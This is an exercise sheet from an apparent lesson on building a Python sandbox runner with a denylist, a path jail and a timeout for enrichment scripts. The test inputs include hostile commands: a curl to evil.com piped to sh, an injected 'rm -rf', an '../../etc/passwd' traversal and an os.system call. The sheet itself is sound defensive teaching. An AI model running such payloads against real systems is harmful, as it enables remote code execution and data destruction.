# Exercises — Capstone Lesson 26: Sandbox Runner with Denylist and Path Jail

## Exercises

1. **Implement the denylist check and confirm it blocks a forbidden payload.** Create a Python script that defines a list of forbidden substrings (include at least `rm -rf`, `os.system`, `__import__`, and `eval`). Write a function that takes a command string, checks it against every entry in the denylist, and raises a `DenylistError` (a custom exception carrying the matched substring and the original payload) on the first hit. Call the function with the string `"os.system('curl evil.com | sh')"` and print the exception details to the terminal. Then call it with `"echo hello"` and confirm it prints `"PAYLOAD CLEAR"`.

2. **Implement the path jail using `os.path.realpath`.** Write a function `jail_check(filepath, root)` that resolves both `filepath` and `root` to their canonical absolute paths via `os.path.realpath`, then verifies the resolved filepath starts with the resolved root. If it does not, raise a `PathJailError` containing both the resolved path and the root. Test with root set to `/tmp/sandbox` and filepaths `../../etc/passwd`, `data/leads.csv`, and a symlink you create pointing outside the root. Print `PASS` or the exception for each case.

3. **Build the complete `SandboxRunner` class** that wraps `subprocess.run` with all three controls: denylist, path jail, and a wall-clock timeout. Instantiate it with a denylist set, a root directory, and a timeout in seconds. Its `.run(command, files=None)` method should check the command against the denylist, resolve every path in `files` through the jail, then call `subprocess.run` with the timeout. Run a GTM enrichment script that reads a CSV of company domains from `/tmp/sandbox/domains.csv` and writes enriched results back to the same directory. Confirm successful execution prints the script's stdout. Then run the same command with an injected `; rm -rf /tmp/sandbox` appended and confirm the denylist blocks it before `subprocess.run` is ever called.

4. **Trace five adversarial payloads through your `SandboxRunner` and confirm each is caught by the correct control.** Write a test harness that feeds these five payloads (adapt the commands to your OS): (a) `"cat ../../etc/passwd"` with files set to `["../../etc/passwd"]`, (b) `"python -c '__import__(\"os\").system(\"whoami\")'"`, (c) `"sleep 30"` with a 2-second timeout, (d) `"echo $(eval('1+1'))"`, (e) a payload that writes to `../../../tmp/pwned`. For each payload, print the payload, which control caught it (denylist, jail, or timeout), and the exception message. All five must be intercepted before any untrusted code executes.

5. **Build an allowlist-based runner as an alternative to your denylist runner and compare their behavior on the same set of test commands.** Implement `AllowlistRunner` in `handlers/allowlist_runner.py` that accepts only commands matching a set of exact prefixes (e.g., `python scripts/enrich.py`, `node webhook.js`, `curl https://api.apollo.io/`). Run both runners against a corpus of ten mixed commands — five legitimate GTM operations (enrich, scrape, webhook post) and five adversarial payloads. Print a side-by-side table showing which runner accepted or blocked each command. Write a one-paragraph comparison to `outputs/skill-denylist-vs-allowlist.md` explaining which strategy is appropriate for a Clay enrichment pipeline where the set of valid commands is known and small versus a developer sandbox where users experiment freely.

6. **Design a sandbox-protected enrichment handler that executes user-supplied Python snippets against Apollo API data.** Implement `handlers/enrichment_sandbox.py` — a handler that receives a JSON payload containing an Apollo company record and a user-authored Python expression to transform it (e.g., extract employee count, normalize domain, classify industry). The handler writes the Apollo record to a temp file inside the jail root, passes the user expression through the denylist and path jail, executes it with the wall-clock timeout, and returns the transformed result. Include at least three transformation expressions that succeed and three adversarial expressions that are blocked (file read, import, infinite loop). Run the handler from the command line with `python handlers/enrichment_sandbox.py` feeding a sample Apollo record, and print the results of all six expressions.
